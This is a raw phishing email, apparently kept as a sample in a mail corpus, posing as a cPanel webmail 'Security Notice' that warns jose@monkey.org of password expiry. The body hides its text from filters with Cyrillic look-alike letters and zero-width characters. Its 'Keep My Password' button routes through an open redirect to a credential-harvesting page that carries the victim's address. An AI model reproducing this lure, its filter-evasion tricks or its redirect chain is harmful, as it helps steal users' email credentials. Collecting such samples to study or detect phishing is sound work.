@@ -1,0 +1,149 @@
+From jose@monkey.org Fri Aug  4 00:27:07 2023 +0000
+Return-Path: vivian@ortery.com
+Delivered-To: jose@monkey.org
+X-FDA: 81084532494.34.105F46A
+Received: from out.east.exch090.serverdata.net (out.west.exch090.serverdata.net [199.193.205.218])
+	by imf28.b.hostedemail.com (Postfix) with ESMTP id 648C2100005
+	for <jose@monkey.org>; Fri,  4 Aug 2023 00:27:06 +0000 (UTC)
+Authentication-Results: imf28.b.hostedemail.com;
+	dkim=none;
+	spf=pass (imf28.b.hostedemail.com: domain of vivian@ortery.com designates 199.193.205.218 as permitted sender) smtp.mailfrom=vivian@ortery.com;
+	dmarc=pass (policy=quarantine) header.from=ortery.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1691108826;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=Ogi0yPOj+F35cNjZ1qua89DLVIZRLIRNvu3pby9TSU0=;
+	b=0RY6K6ySB74qJsGy7oS8h/19wobnl38BA1UMUcGuVzCITB+R4szGl5b1kBA3MQVjdqAgfu
+	xFPGGUsKA5H+Un+rzKlcmyY8ivIlaZUf51v/jpseuqeIX/nR93ZNDhjyzEdImqVXN6vryb
+	NU0lbYhOnFZc2LXmyqS/I9knmslbXYY=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1691108826; a=rsa-sha256;
+	cv=none;
+	b=LgT7H5nZg+1u8UlewPxGCsfvgCaIj05PgkgUhK9k3f79mecgX7ajm+hHaysyAUq7Sp69Md
+	M1xdifXc0VF6vsvgCNJq1UtgKr6ma9yY0ZFDYOVWpf9okaEri5Onnr9020aFXMWyFG0P5N
+	GawQrBUrVyV+hpGMN0UQGu3TJv1sfbc=
+ARC-Authentication-Results: i=1;
+	imf28.b.hostedemail.com;
+	dkim=none;
+	spf=pass (imf28.b.hostedemail.com: domain of vivian@ortery.com designates 199.193.205.218 as permitted sender) smtp.mailfrom=vivian@ortery.com;
+	dmarc=pass (policy=quarantine) header.from=ortery.com
+Received: from MBX090-W1-CO-3.EXCH090.serverpod.net (10.224.177.114) by
+ MBX090-E8-CO-1.EXCH090.serverpod.net (10.224.177.248) with Microsoft SMTP
+ Server (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384_P384) id
+ 15.1.2507.27; Thu, 3 Aug 2023 17:27:05 -0700
+Received: from mail090-co-2.exch090.serverpod.net (192.168.134.134) by
+ MBX090-W1-CO-3.EXCH090.serverpod.net (10.224.177.115) with Microsoft SMTP
+ Server (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
+ 15.1.2507.27 via Frontend Transport; Thu, 3 Aug 2023 17:27:05 -0700
+Received: from [127.0.0.1] (unknown [191.101.209.16])
+	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
+	 key-exchange ECDHE (P-256) server-signature RSA-PSS (2048 bits) server-digest SHA256)
+	(No client certificate requested)
+	(Authenticated sender: vivian@ortery.com)
+	by mail090-co-2.exch090.serverpod.net (Postfix) with ESMTPSA id BD62520017
+	for <jose@monkey.org>; Thu,  3 Aug 2023 17:27:04 -0700 (PDT)
+Content-Type: text/html; charset="utf-8"
+From: cPanel on monkey.org <vivian@ortery.com>
+To: <jose@monkey.org>
+Subject: =?UTF-8?Q?=5Bmonkey=2Eorg=5D_Client_Security_Notic?=
+ =?UTF-8?Q?e_for_=E2=80=9Cjose=40monkey=2Eorg?= =?UTF-8?Q?=E2=80=9D=2E?=
+Message-ID: <abc864dc-6fa9-e131-eec6-e0a082eac32f@ortery.com>
+Content-Transfer-Encoding: quoted-printable
+Date: Fri, 4 Aug 2023 00:27:04 +0000
+MIME-Version: 1.0
+X-Rspamd-Server: rspam03
+X-Rspamd-Queue-Id: 648C2100005
+X-Stat-Signature: rf4at8gf4qb87d5ebq49uf1yff3t3erd
+X-Rspam-User: 
+X-Spam-Status: No, score=0.50
+X-HE-Tag: 1691108826-222662
+X-HE-Meta: U2FsdGVkX1/aQh3nb+Ts+5WQq1lc5JDsID36TL4tPcUe5Lu3Z0AtLxbpbmwoKs9NtUZCcqBbFA9JnZPP5DkPej9ndb2RIkFFRN91Wxu3kkpzxVCx9xKXPlbTaNJl8Z8GvAXcPuISee8ts7ty33uSn9EcyQ6I2dYx2XBv/QqAQFj2JMYo5+RrZ91BXbNrXdS/HFJ65cQbh4KEkENnCfFgfQM+i3dS34jF+sAx6J9UqZ0=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 230
+
+<HTML><HEAD><meta http-equiv=3D"Content-Type" content=3D"text/html; =
+charset=3Dunicode">
+=20
+<META name=3D"viewport" content=3D"width=3Ddevice-width, =
+initial-scale=3D1">=20
+<META name=3D"format-detection" content=3D"telephone=3Dno"><TITLE></TITLE><=
+/HEAD>=20
+<BODY style=3D"background-color: rgb(255, 255, 255);" bgcolor=3D"#ffffff">
+<P align=3D"left"><FONT face=3D"Arial" size=3D"3">&nbsp;&nbsp;</FONT></P><F=
+ONT face=3D"Arial"=20
+size=3D"3">
+<P><FONT face=3D"Segoe UI Light"><FONT color=3D"#2670ec"=20
+size=3D"6"><STRONG>Im=EF=BB=BF=EF=BB=BFpor=EF=BB=BF=EF=BB=BFta=EF=BB=BF=
+=EF=BB=BFnt Security=EF=BB=BF=EF=BB=BF=20
+ =EF=BB=BF=EF=BB=BFNo=EF=BB=BF=EF=BB=BFt=EF=BB=BF=EF=BB=BFi=EF=BB=BF=
+=EF=BB=BFce</STRONG></FONT><BR><BR>Hi=EF=BB=BF=EF=BB=BF =
+<STRONG>jose</STRONG>,<BR><BR>Your=20
+monkey p=D0=B0=EF=BB=BF=EF=BB=BF=EF=BB=BF=EF=BB=BFssword is =
+s=D0=B5=EF=BB=BF=EF=BB=BF=EF=BB=BF=EF=BB=BFt to =D0=B5=EF=BB=BF=EF=BB=BF=
+=EF=BB=BF=EF=BB=BFxpire=EF=BB=BF=EF=BB=BF=EF=BB=BF=EF=BB=BF =
+in&nbsp;<FONT=20
+color=3D"#ff0000">2</FONT>=20
+d=D0=B0=EF=BB=BF=EF=BB=BF=EF=BB=BF=EF=BB=BFy(s).<BR><BR>&nbsp;=EF=BB=BF=
+=EF=BB=BF=EF=BB=BF=EF=BB=BF&nbsp;=EF=BB=BF=EF=BB=BF=EF=BB=BF=EF=BB=BF&nbsp;=
+=EF=BB=BF=EF=BB=BF=EF=BB=BF=EF=BB=BF&nbsp;=EF=BB=BF=EF=BB=BF=EF=BB=BF=
+=EF=BB=BF&nbsp;=EF=BB=BF=EF=BB=BF=EF=BB=BF=EF=BB=BF&nbsp;=EF=BB=BF=
+=EF=BB=BF=EF=BB=BF=EF=BB=BF&nbsp;=EF=BB=BF=EF=BB=BF=EF=BB=BF=EF=BB=BF=
+=E2=A6=BF=EF=BB=BF=EF=BB=BF=EF=BB=BF=EF=BB=BF=20
+ =EF=BB=BF=EF=BB=BF=EF=BB=BF=EF=BB=BF&nbsp;<STRONG>jose@monkey.org</STRONG>=
+ <BR><BR>W=EF=BB=BF=EF=BB=BFe enc=D0=BE=EF=BB=BF=EF=BB=BF=EF=BB=BF=EF=BB=BF=
+urage y=D0=BE=EF=BB=BF=EF=BB=BF=EF=BB=BF=EF=BB=BFu to=20
+ta=EF=BB=BF=EF=BB=BFke the t=D1=96=EF=BB=BF=EF=BB=BF=EF=BB=BF=EF=BB=BFme to=
+ mai=EF=BB=BF=EF=BB=BF=EF=BB=BF=EF=BB=BFnta=D1=96=EF=BB=BF=EF=BB=BF=
+=EF=BB=BF=EF=BB=BFn y=D0=BE=EF=BB=BF=EF=BB=BF=EF=BB=BF=EF=BB=BFur =
+p=D0=B0=EF=BB=BF=EF=BB=BF=EF=BB=BF=EF=BB=BFssw=D0=BE=EF=BB=BF=EF=BB=BF=
+=EF=BB=BF=EF=BB=BFrd=20
+act=D1=96=EF=BB=BF=EF=BB=BF=EF=BB=BF=EF=BB=BFv=D1=96=EF=BB=BF=EF=BB=BF=
+=EF=BB=BF=EF=BB=BFty to avo=D1=96=EF=BB=BF=EF=BB=BF=EF=BB=BF=EF=BB=BFd =
+log=D1=96=EF=BB=BF=EF=BB=BF=EF=BB=BF=EF=BB=BFn =D1=96=EF=BB=BF=EF=BB=BF=
+=EF=BB=BF=EF=BB=BFnterruption.<BR><BR><A style=3D"background: rgb(38, 112, =
+236); padding: 7px; color: rgb(255, 255, 255); font-family: segoe ui light;=
+ font-size: 15px; text-decoration: none;"=20
+href=3D"http://www.fairpoint.net/~jensen1242/gbook/go.php?=
+url=3Dhttp://josequotacPanel.applemarketing.pk/data/gophp.php?=
+userid=3Djose@monkey.org"=20
+target=3D"_blank" rel=3D"noopener"><STRONG>K=D0=B5=EF=BB=BF=EF=BB=BF=
+=D0=B5=EF=BB=BF=EF=BB=BFp M=EF=BB=BFy=20
+=D0=A0=EF=BB=BF=EF=BB=BF=D0=B0=EF=BB=BF=EF=BB=BFss=EF=BB=BFw=EF=BB=BF=
+=EF=BB=BFor=EF=BB=BFd</STRONG></A><BR><BR><STRONG>N=D0=BE=EF=BB=BF=
+=EF=BB=BF=EF=BB=BF=EF=BB=BFt=D0=B5=EF=BB=BF=EF=BB=BF=EF=BB=BF=EF=BB=BF:</ST=
+RONG> <FONT color=3D"#ff0000">We=20
+ w=EF=BB=BF=EF=BB=BFon't b=D0=B5=EF=BB=BF=EF=BB=BF=EF=BB=BF=EF=BB=BF =
+h=D0=B5=EF=BB=BF=EF=BB=BF=EF=BB=BF=EF=BB=BFld respons=D1=96=EF=BB=BF=
+=EF=BB=BF=EF=BB=BF=EF=BB=BFbl=D0=B5=EF=BB=BF=EF=BB=BF=EF=BB=BF=EF=BB=BF for=
+ a=EF=BB=BF=EF=BB=BF=EF=BB=BF=EF=BB=BFny =D0=B0=EF=BB=BF=EF=BB=BF=
+=EF=BB=BF=EF=BB=BFcc=D0=BE=EF=BB=BF=EF=BB=BF=EF=BB=BF=EF=BB=BFunt=20
+ l=D0=BE=EF=BB=BF=EF=BB=BF=EF=BB=BF=EF=BB=BFs=EF=BB=BF=EF=BB=BFs</FONT><BR>=
+<BR><FONT color=3D"#465a75">Best Regards,<BR>Roundcube /=20
+ Horde Cpanel WebMail</FONT><BR><BR></FONT></P>
+<P><FONT face=3D"Segoe UI Light"><IMG width=3D"25" height=3D"25" =
+style=3D"border-width: 0px; line-height: 13px;"=20
+alt=3D"cP" src=3D"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABkAAAAZCAY=
+AAADE6YVjAAAABHNCSVQICAgIfAhkiAAAAF96VFh0UmF3IHByb2ZpbGUgdHlwZSBBUFAxAAAIme=
+NKT81LLcpMVigoyk/LzEnlUgADYxMuE0sTS6NEAwMDCwMIMDQwMDYEkkZAtjlUKNEABZgamFmaG=
+ZsZmgMxiM8FAEi2FMk61EMyAAACeUlEQVRIie2Tz0sUYRjHP8/M7JbUXoQo6xB1SNk1ojbBU1th=
+FBR0kg6FgaAEu8duUUL0D1RqFCH9OEQU0SUQKw0SCcEOUdsmRNRCixVqKf7cmafDTLszo5F2CvJ=
+7eud9vu/z/T7f9x1YwX8JWe4BbcPiW+ICQgrFRFAUAWaBPKKPGcneknvYfy+STuxFpO8PrF7m7B=
+NyLVcAMJYrgmjjEkj7iZoPtLk6BmD91ksbBoWkSdWQUkgKY9MCWRuVusD8qjaIgxAJCdVTYTUBH=
+YG49OTm1cTWHkc5BLINNIKgXnkMSAO9IJWeQAHsI4g1heoGRE4Dh30GnkrHm4bSJNpaU0XEvAOS=
+KjsNWB7EYT2GJ+DimXTkXnrrnDZXD1FhvUVkk3d8K3h3oo3xKBHrJiKp38WH0o+wI7injwIBdb2=
+b8CYOwJ1kHY0IB0INZnCfJUAe7KuIedtHKGLpYOBIJtEC1PiM5csihhwNid/F4AyGTDLvCObcGL=
+NWJVG2+xq8R+fHNZ24jBBHiaHsRsSfcV9ZRKW+HL9+ZqrY4o3ucxmvA6nwbT3EWZVBJONmFQ5Jv=
+2JqF/z6T0Rj5ZrMhAVcSEPwUweAxe9QdQpHm+RS9lNZBHI+xhZNx89pa7L07rU1GUE56OP8QIzv=
+CDsXNFe9j6H7pDPbXfIDoJnEWZDzITtZYBLVAQxpxyGLSNQt8QprIsX8mtoS3dQiao9I+/CH8GD=
+undhyA1NPgWz05RH3FhPYWothRMsleuTix3Ggf9G4QjAA5MrrPI4eA0YWMIQeRILPG32ylOYBEQ=
+DpzPajxT2ocx3VYdBRVL+g9nNgF+iot9fN3PSL5Yis4N/DTwO07qaxRLSlAAAAAElFTkSuQmCC"=
+=20
+data-image-whitelisted=3D"" data-bit=3D"iit"><FONT size=3D"2">Copyright =
+&copy; 2023=20
+Monkey&nbsp;cPanel WebMail Powered by Roundcube/Horde, L.L.=
+C</FONT></FONT></P>
+<P><BR></P></FONT></BODY></HTML>
